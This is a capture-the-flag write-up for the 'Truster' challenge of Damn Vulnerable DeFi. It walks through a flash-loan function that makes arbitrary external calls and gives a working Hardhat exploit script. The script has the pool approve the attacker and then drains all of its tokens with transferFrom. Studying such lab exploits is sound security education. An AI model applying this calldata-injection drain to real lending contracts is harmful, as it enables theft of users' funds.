## Challenge #3 - Truster
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

---

First of all, check the origin test script:

```javascript
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // deploy contracts and check variables.
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);
        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});
```

So in the test script we can see that it want to do a flash loan, so we have to check the function of flash loan.

```javascript
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
```

In the flash loan function we can see that there can be a calldata can send into the flash loan function.
So if we make the flash loan contract to help us approve the token in calldata, and then we can transfer all of the token from pool.

So the answer test script can be like this:
```javascript
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // deploy attack contract
        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", player);
        const attackContract = await AttackTrusterDeployer.deploy(pool.address, token.address);

        const attackToken = token.connect(player);
        const amount = 0;
        const borrower = player.address;
        const target = token.address;

        // Create the ABI to approve the attacker to spend the tokens in the pool
        const abi = ["function approve(address spender, uint256 amount)"]
        const iface = new ethers.utils.Interface(abi);
        const data = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])

        await attackContract.attack(amount, borrower, target, data);
        
        const allowance = await attackToken.allowance(pool.address, player.address);
        const balance = await attackToken.balanceOf(player.address);
        const poolBalance = await attackToken.balanceOf(pool.address);

        // we can see that the allowance amount is equal to the amount of pool balance so that we can transfer tokens away.
        console.log("Attacker balance:", balance.toString())
        console.log("Pool balance:", poolBalance.toString())
        console.log("Allowance:", allowance.toString());

        await attackToken.transferFrom(pool.address, player.address, allowance);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});
```
